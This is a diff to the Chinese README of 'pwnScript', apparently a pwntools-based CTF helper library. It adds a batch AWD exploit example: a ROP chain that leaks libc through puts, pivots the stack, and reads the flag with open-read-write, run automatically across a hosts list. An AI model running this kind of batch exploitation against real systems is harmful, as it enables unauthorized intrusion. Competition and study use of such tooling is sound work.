@@ -2,6 +2,22 @@
 
 
 
+## 目录 
+
+- [pwnScript](#pwnScript)
+  - [目录](#目录)
+  - [前言](#前言)
+  - [简介](#简介)
+  - [快速上手](#快速上手)
+  - [教程](#教程)
+  - [示例](#示例)
+  - [TODO](#TODO)
+    - [Libcsearcher](#Libcsearcher)
+    - [Shellocde](#Shellocde)
+    - [Heap](#Heap)
+    - [~~Awd~~](#Awd)
+  - [其它](#其它)
+
 ## 前言
 
 之前写过一个pwn的script，主要是方便比赛中exp编写和调试。但是因为最初只是为了方便，导致现在很难迭代更新。所以打算重新写一个，目的还是方便自己使用。
@@ -14,7 +30,7 @@
 
 
 
-目前有的功能：
+目前（2.1.1）有的功能：
 
 - 对pwntools常用命令封装如：send，recv，interactive等
 - 简单的日志输出等级，可以自行调用
@@ -23,6 +39,13 @@
   - 或者会自动生成一个默认版本的gdb.sh，断点可以用raw_input暂停函数也可也自己调用ggdb设置断点等
 - 简单的shellcode生成，和之前存的一些shellcode，都可以直接使用。
 - 栈溢出的简单利用，ret2libc或者ret2orw等
+
+
+
+2.1.2新增功能：
+
+- awd自动化批量获取、打印、保存、提交flag。关于提交可能会由于目标平台不同方式不同，这部分预留接口，可以在比赛中自行更改。
+- 完善了使用ropper进行gadgets获取时，需要每次都search一次，在进行awd批量进行时会非常耗时，这里优化了该部分代码，将可找到的gadget存放在当前目录的文件中，以便之后使用。存放原则是只在调用远程时使用。
 
 
 
@@ -369,6 +392,91 @@ if __name__ == '__main__':
 
 
 
+awd示例：
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+'''
+Help: 
+    python3 exp.py --help
+    python3 exp.py debug --help
+    python3 exp.py remote --help
+Local:
+    python3 exp.py debug --file ./pwn
+Remote:
+    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
+    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
+'''
+
+from ckyan.pwnScript import *
+
+def exp():
+
+    pandora_box.init_script()
+
+    elf = pandora_box.elf
+    libc = pandora_box.libc
+    p = pandora_box.conn
+    rop_attack = pandora_box.ropper_attack
+
+    padding = 0x100 + 8
+    main_addr = 0x40130C
+
+    rop_attack.set_padding(padding=padding)
+
+    ru(b'this task.\n')
+    rop_attack.puts(target_addr=elf.got['puts'],
+                    return_func_addr=main_addr,
+                    is_send=True)
+
+    libc_base = r7f() - libc.sym['puts']
+    set_libc_base_and_log(libc_base)
+
+    rop_attack.update_padding(padding=padding-8)
+    
+    stack_migration_addr = 0x404048
+    leave_ret_addr = rop_attack.search_gadgets('leave;ret')
+    
+    ru(b'this task.\n')
+    rop_attack.read(rbp_value=stack_migration_addr,
+                    target_addr=stack_migration_addr,
+                    return_func_addr=leave_ret_addr,
+                    is_send=True)
+
+    rop_attack.update_padding(padding=0)
+
+    flag_name_str_addr = 0x404038
+    flag_addr = 0x404048
+
+    flag = rop_attack.orw_cat_flag(
+        flag_name_str_addr=flag_name_str_addr,
+        flag_addr=flag_addr,
+        flag_prefix=b'XAUTCTF'
+        )
+
+    return flag
+
+if __name__ == '__main__':
+    # exp()
+    awd = Awd(
+        hosts_file="./datas/hosts.txt",
+        # static_ip="127.0.0.1",
+        # ports_file="./datas/ports.txt",
+        flags_path="./flags/",
+        flags_file_name_sign="1",
+        binary="./vuln",
+        remote_libc="./libc.so.6",
+        exploit=exp)
+    
+    awd.attack(print_flag=True, send_flag=False, save_flag=True)
+
+```
+
+
+
+
+
 ## TODO
 
 ### Libcsearcher
@@ -423,12 +531,13 @@ if __name__ == '__main__':
 
 
 
-### Awd
+### ~~Awd~~
 
-然后就是awd的一些脚本，配合pwnScript使用，自动攻击，自动提交flag等。
+~~然后就是awd的一些脚本，配合pwnScript使用，自动攻击，自动提交flag等。~~
 
 
 
 ## 其它
 
 水平一般，代码很烂，如有bug，欢迎吐槽。但希望不要言语攻击QAQ，骂了就哭 :(
+
